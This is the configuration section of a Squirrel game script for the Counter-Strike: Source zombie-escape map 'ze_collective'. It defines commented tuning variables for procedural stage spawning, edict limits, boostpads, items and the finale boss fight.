//======================================\\
//	 By Luffaren (STEAM_1:1:22521282)	\\
//======================================\\
//	http://luffaren.com/ze_collective	\\
// CS:S port by Luffaren, based on v1_9 \\
//======================================\\



	//Please do not alter or port this map elsewhere, thank you




	//My .nuts are not for everyone, do not expect pleasure if you intend to indulge in them
	//I will not judge you for looking upon my .nuts
	//In return, please do not judge my .nuts for being what they are
	//Amen




	//Huge thanks to Ficool and Xen for helping out with a bunch of technical issues that came with the CSS port
	//They are in no way responsible for the spaghetti below, don't slander them for it





//==========================================================================================================================================================\\
DEBUG <- null;						//setting this to string of id (like "#12345") will spawn the ID a bit in front of spawn and abort the normal gameplay
::PRINT_ALLOWEDMAPS <- false;		//set this to 'true' to print out a full list of all the allowed maps every time a map gets picked
DEBUG_TPDEST <- false;				//set this to 'true' to debug-draw the ::tpdest origin
::FORCE_THEME <- null;				//null:ignore, else string of theme to force
::ENDING_DEBUG <- false;			//set to 'true' to force-test an ending (after completing the first stage)
::DEBUG_COLOR <- false;				//setting this to 'true' forces the spawned pieces to be colored to their pixel-color (the "generic" theme replicates this automatically)
::process_stacktrace <- false;		//set to 'true' to run proper stacktrace if something goes wrong during stage-spawn (keep this variable turned off by default to be safe!)
GRID_SIZE <- 96;					//the piece XY unit size (diameter)
MAP_SIZE <- 20;						//the map/pixel-image size, should most likely never ever need to change (..unless...?)
ELEVATION <- 30;					//the unit-amount for +-1 "elevation" step, +-1 runs ramp/stair, +2 would allow easier jump (60 units), +3 would be impossible to jump (90 units)
BUFFER_SIZE <- 5;					//creates a 4-tile wide bridge of <THIS length between stages (could be useful to prevent players jumping from one stage to the other), endings does NOT create bridge *0 in v1*
BUFFER_SIZE_SPAWN <- 10;			//same as above^ but an override JUST for the very first time (spawn), having it longer will make it less harsh to defend the first stage
BUFFERBRIDGE_SIDEHEIGHT <- 0;		//height to +- to the bufferbridge sides (4 grid-sizes wide, this only affects the 2 on the sides, 2 middle ones are floor-level), -8 was set before
::AFK_RESPONSE <- 3;				//what to do for AFK ct's when MZs spawn (or if enough time passes)	(1:slay, 2:do nothing, 3:move player to end of spawn-bufferbridge)
FORCE_HEIGHTAMOUNT <- null;			//null:ignore | negative:force maps that go DOWNWARDS more than X | positive:force maps that go UPWARDS more than X
STRAIGHT_UNTIL_WARNING <- false;	//set this to true to always force 'forward' maps until EDGE_WARNING is reached
EDGE_WARNING <- 7000;				//if stage pos is this far out or more, deny going out further in that direction
EDGE_LIMIT <- 10000;				//if stage pos is this far out or more, force going in the opposite direction (as "forward" stages can still drift left/right)
HEIGHT_LIMIT <- 3000;				//if stage pos (Z/height) is this far out or more, prevent spawning stages that go up or down any further (based on the limit-direction)
::EDICTS <- 0;						//dynamic "extra" edicts int to ++/-- from spawning/killing things dynamically (traps/items/etc), will be included in the edict-estimation
::SPAWNMAP_SUSPEND_RETRY <- 0.05;	//certain servers have issues with the SpawnMap() aborting sometimes, this variable sets the time-delay before trying again
::NEXTMAPGEN_TIME_OVERRIDE <- null;	//null:ignore, else set it to float value >= 0.00, if set: it overrides the time it takes to generate the next level on level-end
::STAGE_COST_LIMIT <- null;			//set to 'null' to ignore, else set it to an integer-value, when a new stage gets picked > disallow stages with a cost above this value
::STAGE_COST_LIMIT_UPPER <- null;	//set to 'null' to ignore, else set it to an integer-value, when a new stage gets picked > disallow stages with a cost below this value
EDICT_LIMIT <- 1000;				//disallow spawning stages that would make the total-estimated edict-cost exceed this value, based from the current stuff spawned in (stage_edict_count), *1000 in v1*
EDICT_LIMIT_TRAPS <- 800;			//disallow spawning traps if the total-estimated edict-cost exceeds this value
EDICT_LIMIT_ITEMS <- 900;			//disallow spawning items if the total-estimated edict-cost exceeds this value
EDICT_LIMIT_EMERGENCY <- 100;		//if no valid stages can't be found/spawned (should never ever happen with enough maps in the pool...), emergency-pick a random map under this edict-amount
EDICTS_BASE_ESTIMATE <- 200;		//the round-start 'report_entities' edict-estimate count, used to print/track edict-count (update this with new map versions to get an accurate number)
::BLOCK_RENDERMODE <- 0;			//which rendermode to default for the blocks (1 or 3 is alright, 3 fixes skybox-render-order, but borks liquids)  __CSS__ og csgo:1, now 0
::DISABLE_SKYBOXMODELS <- false;	//set this to 'true' to disable/not spawn skybox-related props
TP_DELAY <- 6.00;					//how many seconds to wait until updating the TP-pos to the start of a new map (time it so it's pretty much just as previous stage fades out 100%)
TP_Z_OFFSET <- 8;					//how many units to TP above the teleport-dest
if(!("CHEAP_PLAYERMODELS" in this))
			//__CSS__ disabled default cheap playermodels
	::CHEAP_PLAYERMODELS <- true;	//set to 'true' to force "csgo\models\player\custom_player\luffaren\playercheap_ct/z.mdl" for players to help FPS (glove issues, may also crash, off by default in v1_3)
::CHEAP_PLAYERMODELS_TINT <- false;	//set to 'false' to set "rendercolor 255 255 255" if '::CHEAP_PLAYERMODELS' is true (else leave it to whatever the servers are doing...)
AREAFADE_DELAY <- 0.00;				//how many seconds to wait until starting to fade out the stage
AREAFADE_SPEED <- 10;				//how much to -= the alpha every 0.20s (for stage fade), 5 would be around ~10s until reaching 0/cleaning
AREAFADE_SPEEDT <- 0.20;			//how fast to tick the alpha reduction on stage-exit^
AREA_BBOX_TEST <- false;			//set this to 'true' to check for/prevent the next map to spawn inside the previous map (can be 'false' if areafade^ is faster) (forces true if(MAX_AREA_HISTORY>1))
DEFAULT_ELEVATION <- 10;			//if something goes wrong/it finds no neighboring elevations, default to this elevation (this should probably never ever change, stick to 10!)
::ITEMFALL_CLEANUP_RATE <- 20.00;	//every X seconds (this) it auto-scans/cleans all "item_" targetnamed buttons at the bottom of the map
::STAGE_ENTRY_MSG_DELAY <- 0.70;	//how long to wait until printing out "now entering..." message + showing HTML image preview (as stage spawns)
::DESPAWNFADE_FX <- true;			//set to 'true' to smoothly fade out tiles as they despawn (old stage when new stage generates) (false: sets low alpha ONCE to "warn" about despawning)
::DESPAWNFADE_FALSESET <- 100;		//if '::DESPAWNFADE_FX'^ is false, set the alpha of despawning stage to this (once)
::SPAWNFADE_FX <- true;				//set to 'true' to smoothly fade in the tiles as they spawn
::SPAWNFADE_ALPHA_ADD <- 60;		//the amount of alpha to += for the spawnfade^
::SPAWNFADE_ALPHA_TADD <- 0.05;		//the rate to += the alpha to spawnfade^
::EXITFADE_PHYSENABLED <- false;	//set to 'true' to randomly make pieces fall/enable physics as the stage fades out, kinda cool, but *may* be a bit performance-heavy?
::process_stage_tickrate <- 0.01;	//how fast to tick/process the stage-spawning		(for the main stages themselves)
::process_stage_tickamount <- 6;	//how many stage-tiles to process each tick^		(for the main stages themselves)
::tickspawnqueue_procamount <- 3;	//how many times to process a spawngen every frame	(for items/traps/misc stuff) (more: items+traps+misc stuff spawn in faster, but more performant-heavy)
stage_end_pos_range <- 110;			//how many units from the stage end-position a player must be within to trigger the stage-end (if no ENDBUTTON tile exists in the stage)
stage_end_pos_allowdifh <- false;	//set this to 'true' to allow triggering from below/far above, else the player MUST be above the end-indicator
::ENABLE_ENDING_MUSIC <- true;		//set to 'true' to play the ending-specific music (stops the currently playing theme/stage music), 'false' just keeps the default music running
ENABLE_HTML_PRINT <- true;			//enables the HUD map-preview image by HTML, if valve decides to break shit again, just set this to 'false' to easily disable it *true in v1*
HTML_PRINT_POSTDELAY <- 1.50;		//how fast to tick the PRINTPOST-function (it's also the starting-delay)
HTML_PRINT_HOLDTIME <- 15.00;		//how long to hold the image on-screen		<this + ~2s holdtime-delay		(15.00 or null is good)		(null:keep printing forever)
::PRECIPITATION_ENABLED <- true;	//set this to 'false' in order to force-abort precipitation + effects from being spawned in
::PRECIPITATION <- 0;				//call this:		SetPrecipitation(index);		0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
::THEME <- "generic";				//the theme to run with, "generic" is the standard/default/fallback theme (is scrambled on map start now)
::OPEN_HOLDS_ON_NEWSTAGE <- true;	//set this to true to open all current-stage HOLD/GENERICHOLD tiles + kill all buttons + break all breakables just as the next stage starts generating
::OPEN_HOLDS_ON_NEWSTAGE_D <- 4.00;	//the time-delay to run this^ (0.00 is relative to when the previous stage is JUST starting to fade out)
::DISABLE_HOLDS_BUTTONS <- false;	//set this to 'true' to replace all HOLD_/BUTTON_ + ENDBUTTON + GENERICHOLD tiles with ASSUMEDFLOOR
::DISABLE_BREAKABLES <- false;		//set this to 'true' to replace all BREAKABLE tiles with ASSUMEDFLOOR
::STAGEFILTER_RACE <- false;		//set to 'true' to ONLY allow stages that start with "RACE" in their map-name (hardcode-enabled for the RACE ending)
::STAGEFILTER_RACE_REV <- true;		//set to 'true' to NOT allow stages that start with "RACE" in their mapname (if '::STAGEFILTER_RACE'^ is set to 'false')
::Z_ITEMS_IN_SPAWN <- 3;			//how many zombie items (randomly picked) to spawn in the spawn area each round (this value is now hardcoded into ::DIFFICULTIES, EXCEPT for finale)
::Z_ITEMS_IN_SPAWN_FINALE <- true;	//set this to true to also spawn this^ amount of z-items in spawn during the finale (the default^ value above is used for the finale)
::DISABLE_H_ITEMS <- false;			//set this to 'true' to disable HUMAN items from spawning
::DISABLE_Z_ITEMS <- false;			//set this to 'true' to disable ZOMBIE items from spawning
::DISABLE_STREAMDROWN <- false;		//set this to 'true' to disable STREAM (drown)
::DISABLE_TRAPS <- false;			//set this to 'true' in order to disable traps from spawning (except for trapfloor-tiles, see below)
::DISABLE_TRAPFLOORS <- false;		//set this to 'true' in order to disable TRAPFLOOR tiles from spawning
::DISABLE_HAZPLANE <- false;		//set this to 'true' in order to disable anything HAZPLANE-related from spawning
::HAZPLANE_LIP <- 16;				//the lip-distance for the hazplane (positive: going below/downwards from target-elevation)
::HAZPLANE_TOGGLEWAIT <- 0.50;		//the hazplane wait-time before toggling itself when reaching the top/bottom
::HAZPLANE_DSPEED_S <- 10;			//the hazplane SLOW speed
::HAZPLANE_DSPEED_M <- 40;			//the hazplane MEDIUM speed
::HAZPLANE_DSPEED_F <- 100;			//the hazplane FAST speed
::MOVEPLAT_SPEED_S <- 80;			//the moveplat SLOW speed
::MOVEPLAT_SPEED_M <- 140;			//the moveplat MEDIUM speed
::MOVEPLAT_SPEED_F <- 220;			//the moveplat FAST speed
::ELEHOLD_FREEZEFIX_RATE <- 15.00;	//the rate to run DisableDraw>EnableDraw on elevator+hold visuals (they seem to potentially freeze for some players sometimes) *calls ::ELEHOLD_FUNC();*
::ELEFREEZEFIX_NEWRATE <- 0.03;		//null:disable, else it'll spawn a non-solid prop_dynamic that tick-follow the 'real' elevators (which get force-disabledrawn) (same tickrate for HAZPLANE)
::DISALLOW_CROUCHES <- false;		//set this to 'true' to disallow stages including CROUCH/CROUCHTALL tiles to get picked
::DISALLOW_ELEVATORS <- false;		//set this to 'true' to disallow stages including ELEVATOR tiles to get picked
::DISALLOW_MOVEPLAT <- false;		//set this to 'true' to disallow stages including MOVEPLAT/MOVEPLATBIG/MOVEPLATHUGE tiles to get picked
::DISALLOW_ELEVATORS_ITER <- 100;	//if above^ is 'true', iterate random elements of the allowed maps to filter out elevator-free maps by this amount (too much = may bug/stop)
::DISALLOW_CROUCHES_ITER <- 100;	//if above^ is 'true', iterate random elements of the allowed maps to filter out crouch-free maps by this amount (too much = may bug/stop)
::DISALLOW_MOVEPLAT_ITER <- 100;	//if above^ is 'true', iterate random elements of the allowed maps to filter out moveplat-free maps by this amount (too much = may bug/stop)
::FORCE_LADDER_CLIMB <- null;		//null:ignore, true:replace climb with ladder, false:replace ladder with climb
::TRAPFLOOR_SFLAGS_DELAY <- 5.00;	//when a TRAPFLOOR-tile spawns in, wait this time before setting spawnflags 24 (motion disabled + break on touch), prevents auto-break during stage-gen
::TELEHURT_Z_OFFSET <- 2000;		//how many units below the current map-end the FALLTP/HURT should position itself at heigh-wise (should never ever intersect the playable area!)
::ENDBUTCOL <- Vector(111,13,242);	//set to 'null' to ignore, else ALWAYS tint endbutton props to this color (could help read what's important)
MAX_AREA_HISTORY <- 1;				//how many past stages to keep alive before killing (must be >0) (keep at 1, >=2 would be too risky!)
::SKIPSAFE <- 240;					//null:disable || trigger-outwards-lip to stop velocity OnStartTouch IF player isn't close to start/end (balance with BUFFER_SIZE)
::SKIPSAFE_SIDES <- 280;			//null:disable || 2 triggers on left/right of bufferbridge to prevent strafe-skipping from the sides, this value is the outwards-lip
::SKIPSAFE_SIDES_LENGTH <- 200;		//how far along the bufferbridge the side-trigger should run
::SKIPSAFE_SIDES_LIFETIME <- 7.00;	//once the stage has spawned in, wait for this time before killing the side-triggers off
::SKIPSAFE_RADIUS <- 300;			//if player is farther away than this from the start/end (lip taken into account) > stop the velocity
::SKIPSAFE_DOWNVEL <- 300;			//how much downwards-velocity to set on skip-attempt
::SKIPSAFE_T_ONLY <- true;			//set to 'true' to allow CT's/humans to perform skips where applicable, could prevent confusing deaths
::BREAKABLE_HEALTH_BASE <- 5;		//how much hit-based hp each breakable should start out with as a minimum (then adding the playercount-based extra hits on top)
::BREAKABLE_FXLIMIT <- 5;			//how many sounds that are allowed to play for damaging/breaking BREAKABLE tiles
::BREAKABLE_FX_CD <- 0.01;			//the time to reset the '::BREAKABLE_FXLIMIT' amount
::LIQUID_STREAMSHJUMP <- 530;		//the up-velocity to set when boosting from a LIQUID_STREAM_SHALLOW jump											//__CSS__ og csgo was 500
::LIQUID_STREAMSHJUMP_XY <- 375;	//the side-velocity to set when boosting from a LIQUID_STREAM_SHALLOW jump
::LIQUID_STREAMSHJUMP_S <- "*luffaren/boostpad_wet.mp3";	//null:ignore, else it's the sound to play when boosting from a LIQUID_STREAM_SHALLOW jump
::LIQUID_STREAMSH_CD <- 0.30;		//the cooldown for jumping on boosting from a LIQUID_STREAM_SHALLOW jump
::LIQUID_STREAMSH_PD <- 0.05;		//the post-delay for setting the velocity again (for stability reasons)
::LIQUID_STREAMSH_FS <- false;		//set to 'true' to force-set the origin + freeze player before the post-delay^ hits (for stability reasons), else keep false
::BOOSTPAD_TOGGLERATE <- 0.03;		//__CSS__ if above 0.00, each boostpad-trigger will toggle itself at this rate in a think-function, hopefully better stability (og 0.00)
::BOOSTPAD_COOLDOWN_TIME <- 0.70;	//once a player touches a boostpad, wait for this time before allowing the same player to touch the same boostpad again (to prevent loops) //__CSS__ og:0.30
::BOOSTPAD_JUMP_MAXVEL_XY <- 400;	//the max-allowed XY velocity to cap players at when touching BOOSTPAD_JUMP (safety, as people might strafe around/stack velocity...)
::BOOSTPAD_JUMP_VEL_Z <- 720;		//how much Z-velocity that BOOSTPAD_JUMP should set (should NEVER be changed to prevent compatibility issues)		//__CSS__ og csgo was 700
::BOOSTPAD_VEL_XY <- 500;			//how much XY-velocity that BOOSTPAD_X should set (should NEVER be changed to prevent compatibility issues)
::BOOSTPAD_VEL_Z <- 545;			//how much Z-velocity that BOOSTPAD_X should set (should NEVER be changed to prevent compatibility issues)			//__CSS__ og was 520, css2 548
::BOOSTPAD_POSTDELAY <- 0.00;		//the amount of time to wait until calling the actual velocity-setting (keeping velocity stable from server-post-jumpvel)	//__CSS__ og was 0.05 / css3:0.01
::BOOSTPAD_POS_Z_OFS <- 5;			//how many Z-units to offset the position-setter above the boostpad (before the POST-function^)		//__CSS__ og was 0, now changed for css3
::BOOSTPAD_SOUND <- "*luffaren/boostpad.mp3";		//null:ignore, else it's the sound "path/file.mp3" to play a clientsound for players stepping on a boostpad
::TELEPORT_TOGGLERATE <- 0.03;		//__CSS__ how fast to toggle tp triggers
::TELEPORT_SOUND <- "*luffaren/tp_tp.mp3";			//null:ignore, else it's the sound "path/file.mp3" to play a clientsound for players who get teleported by a TP-tile
::TELEBOUNCE_SOUND <- "*luffaren/tp_bounce.mp3";	//null:ignore, else it's the sound "path/file.mp3" to play a clientsound for players who get bounced by a TP-tile
::TELE_B_TP_SOUND <- "*luffaren/tp_tpbounce.mp3";	//null:ignore, else it's the sound "path/file.mp3" to play a clientsound for players who get teleported AND bounced by a TP-tile
::TELEPORT_BOUNCE_ZOFS <- 10;		//__CSS__ adds this to the player's TPDEST .z position, hopefully preventing them from getting stuck
::PRIORITIZE_ITEM_VS_TRAP <- false;	//set to 'true' to always run the spawn-logic for items ahead of the spawn-logic for traps (else it scrambles 50/50)
::LIQUID_SHALLOW_WSPAWN <- true;	//set to 'true' to spawn func_water_analog for shallow liquids (WARNING: 'false' will make it not negate fall-damage)
::LIQUID_TICKRATE <- 0.30;			//how fast to run disable>enable on liquid triggers
::LIQUID_DOPARENT <- true;			//set to 'true' to parent the func_water_analog ent to the closest/valid 'master' block, making it follow as it falls
::LIQUID_ENABLE_DELAY <- 0.01;		//how fast to run "Enable" on liquid triggers (after the "Disable" at 0.00^)
::LIQUID_STREAM_VELCAP <- 300;		//the max-allowed velocity when touching STREAM liquids (players get limited to this on STREAM-push OnStartTouch)
::LIQUID_HURT_CD <- 0.50;			//the hurt-cooldown for hazliquids (may be extra delayed by '::LIQUID_TICKRATE'^)
::LIQUID_RANDROT <- false;			//set to 'true' to randomize the default liquid/hazliquid rots for all themes
::NATURE_LIQUID_RANDROT <- true;	//set to 'true' to randomize the default hazliquid rots for the nature theme (thorns)
//HURTCOOLDOWN <- 0.48;				//the cooldown-time for hazliquid hurts (by context-filter, to prevent stack-damage)(0.48 should be good) *OLD: REPLACED WITH "::LIQUID_HURT_CD"^ IN V1_4*
killtiles_maxphys <- 40;			//(-1 to disable)m above 0 will phys-enable tiles shortly before killing them (via 'KillTilesWithin'), only within this <MAX-limit, else insta-kill
killtiles_physkilltime <- 2.50;		//related to ^above, this value controls how long the pieces will stay alive/fall for before getting killed
::NO_CSM <- true;					//set to 'true' to disable CSM-shading on all spawned blocks/models/liquids
::SHADOW_DIST <- 1;					//the env_cascade_light "maxshadowdistance" keyvalue (csgo/hammer default is 400), upping this prevents weird visuals with fading shadows
::ANGLE_SLOPE_RACE <- false;		//set to 'true' to forcibly change angle/pos-offset for slope tiles (used for RACE ending specifically)
::FORCE_RENDERMODE9 <- false;		//set to 'true' to forcibly set "rendermode 9" on most tiles
::JUMP_VELOCITY <- null;			//null:ignore, else it sets the jump-velocity by the 'player_jump' event, in hopes of making things stable/fair for the jumps between servers
::JUMP_VELOCITY_DELAY <- 0.01;		//0.00:instant, else it delays the jump-velocity setting by this amount of time		__CSS__ <og was 0.00, now 0.01
::JUMP_VELOCITY_CTONLY <- true;		//set to 'true' to make the jump-velocity set ONLY run for ct's
::JUMP_VELOCITY_CROUCHO <- false;	//set to 'true' to only make the jump-velocity set while the player is crouching (checking EyePosition distance to feet)
::LOWGRAV_GRAV <- 0.15;				//the LOWGRAV tile gravity to set (should probably never ever be changed...)
::LOWGRAV_TRIGGER_WIDTH <- 100;		//tile size is 96, 48 would fit "perfectly" but it'd be good with some extra width to make jumps work smoothly (only for LOWGRAV, ignored for LOWGRAV_FLOOR)
::TELEPORT_TRIGWIDTH <- 26;			//how wide the TELEPORT trigger should be (should probably never change)
::TELEPORT_TRIGHEIGHT <- 64;		//how tall the TELEPORT trigger should be (should probably never change)		//__CSS__ og csgo was 48, css needs more height
::TELEPORT_INVERT_Z_VEL <- 400;		//if the player Z-FALL-velocity is faster than this (falling): invert Z-vel on TP to fly upwards instead
::TELEPORT_INVERT_Z_AMOUNT <- 1.00;	//if the player Z-FALL-velocity is mirrored, it will *= -THIS_VALUE for the Z-vel
::TELEPORT_ZVEL_CAP <- 1000;		//the max-allowed Z-vel (upwards) to cap at when touching a TELEPORT trigger (mirrored + non-mirrored 
::GRAVSLIDE_ZVEL_CAP <- 600;		//the max-allowed Z-vel (upwards) to cap at when touching/exiting LOWGRAV+AIRSLIDE triggers
::GRAVSLIDE_XYVEL_CAP <- 800;		//the max-allowed X/Y-vel to cap at when touching/exiting  LOWGRAV+AIRSLIDE triggers
::AIRSLIDE_ZPOS_OFS <- 30;			//when touching an airslide, how far up to position the player from it Z-wise (positive:above) (21 in v1_5 and older)
::AIRSLIDE_ZPOS_OFS_DOWN <- 100;		//__CSS__ the bounds-extent downwards for airslides
::AIRSLIDE_TRIGMAXS_Z <- 30;		//how far up the maxs Z of airslide-trigger should reach (21 in v1_5 and older)
::AIRSLIDE_TRIGMINS_Z <- -10;			//how far down the mins Z of airslide-trigger should reach (0 in v1_5 and older)
::DELAY_TIMEOUT <- 60.00;			//if humans take longer than this to trigger the stage-end (in seconds): enable the delay-damagefilter for zombies
::DELAY_TIMEOUT_SLAY <- 80.00;		//if humans take longer than this to trigger the stage-end (in seconds): slay everyone
::delay_check_minplayers <- 2;		//there must at least be this amount of players (or more) on the server for the delay-logic to run
::delay_check_enabled <- true;		//set this to 'false' to pause+reset the delay-check timer (useful for endings/etc)
::delay_message_timer <- null;		//if humans are delaying, write a chat message every X seconds, null:never (it also always prints the moment you start delaying)
::touchbspawnsafe_maxdist <- 800;	//if a CT touches a spawning block during stage-generation, if they're further away than this (from the START-pos): slay them, else tp safely *300 in v1*
::touchbspawnsafe_time <- 0.10;		//how long the trigger should stay active for blocks spawning in during stage-generation (0.05 MINIMUM)
::Z_ITEM_HP <- 30000;				//how much HP to set for zombies who pick up an item
::kill_afks_on_mz <- true;			//automatically kill all CT's on the spawn-platform when a mother zombie is found (no farming, no spawnboosting)
::roundtime <- 60;					//the roundtime to set on roundstart
::freezetime <- 3.00;				//the freezetime to set on roundstart
::LEVELAMOUNT_BASE <- 5;			//the starting amount of levels to play before reaching the ending
::LEVELAMOUNT_ADD <- 1;				//for each new stage, add this amount to the total amount of levels to play before reaching the ending^
::LEVELAMOUNT_CAP <- 9;				//the max-allowed amount of levels to play each stage, so it doesn't drift away into insane numbers
::EVENT_COOLDOWN_MIN <- 0;			//rng-min amount of levels needed before events are even possible (sets cooldown on roundstart + after running event)
::EVENT_COOLDOWN_MAX <- 5;			//rng-max amount of levels needed before events are even possible (sets cooldown on roundstart + after running event)
::EVENT_CHANCE_BASE <- 15.00;		//when events are possible, run this base chance (0.00-100.00%) to run an event as a new level starts
::EVENT_CHANCE_FAIL_ADD <- 5.00;	//if the event-chance-check^ fails, add/stack this percentage for the next level (stack clears/resets when successful)
::ENDINDICATOR_ENABLE <- true;		//set to 'true' to spawn/enable stage end indicators
::ENDINDICATOR_TOUCH <- Vector(150,0,255),					//the end-indicator model color for when you need to touch it to trigger
::ENDINDICATOR_BUTTON <- Vector(255,0,0),					//the end-indicator model color for when you need to press endbutton(s) to trigger
::ENDINDICATOR_TRIGGERED <- Vector(255,255,255),			//the end-indicator model color for when the ending has been triggered
::ENDINDICATOR_OLD <- Vector(20,20,20),						//the previous-stage end-indicator model color for when the new/current ending has been triggered
::ITEM_H_DESIRED <- 3;										//the initial amount of desired items to spawn (for humans)
::ITEM_Z_DESIRED <- 3;										//the initial amount of desired items to spawn (for zombies)
::ITEM_H_DESIREADD <- [0,1,1,1,1,1,1,2,2,2,2,3,3];			//every new level-spawn, += the amount of desired H items by a random element here
::ITEM_Z_DESIREADD <- [0,1,1,1,1,1,1,2,2,2,2,3,3];			//every new level-spawn, += the amount of desired Z items by a random element here
::ITEM_DESIREADD_SHARED <- true;							//set to 'false' to separate the desire-additions between H/Z (2 vars above^), else they are synced (going by '::ITEM_H_DESIREADD')
::ITEM_DESIRE_FORCESPAWN <- 5;								//if the desire to add either H/Z items is above <this number (AND no item-tile in stage), force-spawn 1 item at stage-start
::ITEM_MAX <- 30;											//if this amount of items exist by FindByName-scan: deny spawning more items via pixel-levels
::ITEM_ENSURE_HEAL_ORB <- 9999;								//it always prioritizes spawning a heal-item if this is above 0 (AND if no heal already exists), runs -- for each spawn (value in ::DIFFICULTIES)
::ITEM_ENSURE_HEAL_ORB_MESSAGE <- true;						//set to 'true' to print a server-message informing about the forced spawn
randomtheme_tickrate <- 0.01;								//when the finale is active, switch between random themes at this rate constantly
randomtheme_tickrate_silenthill <- 10.00;					//when the finale is active, scramble the light/dark world tiles for the silent hill theme willy nilly (expensive)
::bbidx_rand <- [25,25,25,25,5,5,5,5,5,5,5,5,5,5,5,5,105];	//RNG bufferbridge-tile to pick (25:platform,5:floor,105:floorceilingtall,45:floorceiling)
::adminplatform_kill_delay <- 40.00;						//when the round starts, wait this time before killing off the admin-platform above spawn
::infinite_mode_newthemerand_min <- 0;						//during infinite mode, min amount of songs to play before switching theme
::infinite_mode_newthemerand_max <- 5;						//during infinite mode, min amount of songs to play before switching theme
::infinite_mode_newtheme_fade <- false;						//set to 'true' to run a short white fade for everyone as the theme changes
::music_volume_multiplier <- 1.00;							//global multiplier for the main music volume (caps at 1-10)(finale excluded)
finale_tower_height <- 9;							//how many FLOOR-tile heights the tower should be
finale_lowgrav_height_max <- 3;						//how many FLOOR-tile heights the lowgrav section should be (before reaching the elevator)
finale_towerelevator_leavetime <- 60.00;			//how long the finale tower-elevator should wait before leaving (gotta consider the time zombies have from the tower-entry-TP)
::finale_elevator_riding <- false;					//internal value used by 'flight' z item, this var is true when the elevator is moving (goes 'false' a bit earlier, 2s after debris stops)
::finale_infinite_musicfx_instant <- false;			//set 'true' to kick in the special music/fx at the start of the bossfight, else it enables the first music-repeat during the endrun
::finale_infinite_musicfx_instant_delayed <- true;	//set 'true' to set '::finale_infinite_musicfx_instant' to 'true' after the first boss music loop starts (to run one old 'loop' first)
::finale_infinitemode_voteperc <- 70.00;			//the percentage (0-100%) of humans that must vote during infinite mode to "check out" to a harder finale
::finale_infinitemode_minlevels <- 10;				//once you reach this amount of levels during infinite mode, it will start offering a vote to "check out" at each stage-start
::finale_spawnplatform_falldelay <- 10.00;				//as the finale bridge starts crumbling, delay the spawnplatform falling by this time (letting z's get items)
::finale_bridgedestroy_tpqueue <- [];					//TP-pos vectors along bridge, final one inside tower, tiles get destroyed in previous-pos
::finale_bridge_cleanup_rate <- 2.00;					//how fast the early bridge-destruction should tick
::finale_bridge_zdelay_outside <- 20.00;				//how long zombies should stay cucked outside the tower once the TP gets close (time for humans to climb safely)
::finale_bridge_cleanup_delay <- 20.00;					//how many seconds into the round the bridge-remover should start ticking
::finale_bridge_cleanup_remover <- true;				//set to 'true' to run KillTiles along the bridge, else just mass-kill them by delay
::finale_bridge_detailchance <- 7.00;					//percentage-chance (0.00-100.00) to spawn detail tiles along the starting bridge
::finale_bossplatform_smoothvalue <- 17;			//the edge-smoothing-value for the boss arena (if abs(x)+abs(y) is above this = ignore platform-spawn)
::finale_bossplatform_size <- 12;					//how large the boss-arena is ((this*2)*(this*2))=edicts
::finale_boss_falltrig_zoffset <- 500;			//how far down below the arena the fall trigger should be at
::finale_boss_falltrig_cthurt <- 39;			//how much damage the fall trigger should hurt CT's (if they survive damage, they TP back to arena)
::finale_tower_cleanup_start <- 0.00;					//once elevator leaves, how long to wait until starting to clean up tower pieces (making them fall/kill gradually)
::finale_tower_cleanup_rate <- 0.10;					//the rate to make the individual pieces fall/kill gradually, one-by-one
::finale_tower_cleanup_alphastart <- 1.50;				//the time-offset to wait until starting the fadeout/kill after falling
::finale_tower_cleanup_alphareduce <- 20;				//how fast to reduce alpha from 255 to 0 when falling/cleaning (kills at 0)
::finale_tower_cleanup_alpharate <- 0.02;				//the rate to tich the alpha-reduce^
::finale_tower_antiboost_rate <- 0.10;					//how fast to tick anti-boost check for each zombie
::finale_tower_antiboost_vel <- 400;					//if the zombie Z-velocity is above this (upwards), force-set their velocity down again (vanilla jumpvel: 283.243)
::finale_tower_antiboost_startdelay <- 15.00;			//how long to wait before ticking the antiboost (antiboost stops ticking when z's TP to boss-arena-zplatform)
::finale_boss_spawnamount <- 1;						//how many bosses to spawn in the arena (the boss health gets divided by this number as well)
::finale_boss_spawnamount_cap <- 5;					//the max-allowed amount of bosses to spawn in for the bossfight, no matter what
::finale_boss_spawnamount_stage_each <- 0.0004;		//each stage in the map-pool adds to a 'stack' which rounds as an integer, this then adds to '::finale_boss_spawnamount' (BUT ONLY ON INFINITE)
::finale_boss_spawnamount_add_infinite <- 1.00;		//how much to add to the 'stack'^ for the infinite finale mode alone
::finale_boss_dmgmult <- 1.00;						//damage multiplier for all boss attacks (+ falldown trigger)
::finale_boss_dmgmult_add_infinite <- 0.50;			//how much the infinite finale adds to the total damage multiplier^
::finale_boss_dmgmult_stage_each <- 0.0001;			//how much each stage in the map-pool adds to the total damage multiplier^
::finale_boss_dmgmult_stage_each_cap <- 2.00;		//the max-allowed damage-multiplier-add allowed for the map-pool-count^
::finale_boss_hp_base <- 3000;						//how much HP to start with *7000 in v1*
::finale_boss_hp_each <- 17000;						//how much HP to add for each alive CT when the boss starts *800 in v1*
::finale_boss_hp_each_infinite <- 20000;			//how much HP to add for each alive CT when the boss starts (for infinite-mode)
::finale_boss_hp_stage_each <- 30;					//how much HP to add for each stage in the map-pool *10 in v1*
::finale_boss_hp_stage_cap <- 100000;				//the hard-cap for the extra HP added for each stage *30000 in v1*
::finale_boss_hp_ctdeath_reduce <- 8000;			//when a CT dies during the bossfight, remove this amount of HP from the boss
::finale_boss_grenade_damage <- 2500;					//how much damage to deal to the boss for every grenade that hits it *600 in v1*
::finale_boss_grenade_critchance <- 30.00;				//the chance-percentage (0-100) to crit the boss when a nade hits it (canceling all ongoing attacks/modes)
::finale_boss_grenade_crit_time <- 2.00;				//for each grenade-crit that runs, += this time to the stunned/paralyzed effect of the boss
::finale_boss_stuntime_max <- 20.00;				//the max-allowed stun-time to stack from crits (nades/items/etc)
::finale_boss_stuntime_max_infinite <- 10.00;		//the max-allowed stun-time to stack from crits (nades/items/etc) during infinite finale
::finale_boss_eyetouch_cd <- 0.60;					//the cooldown for touching the boss-eye directly (also its disable>enable tickrate) *must be >= 0.05)
::finale_boss_touchdmg_eye <- 90;					//when touching the core/eye, deal this amount of damage (cooldown above^)
::finale_boss_touchdmg_piece <- 5;					//when touching a platform-piece, deal this amount of damage
::finale_boss_touchdmg_midspin <- 9;				//when touching a platform-piece while the boss performs a 'MIDSPIN' attack
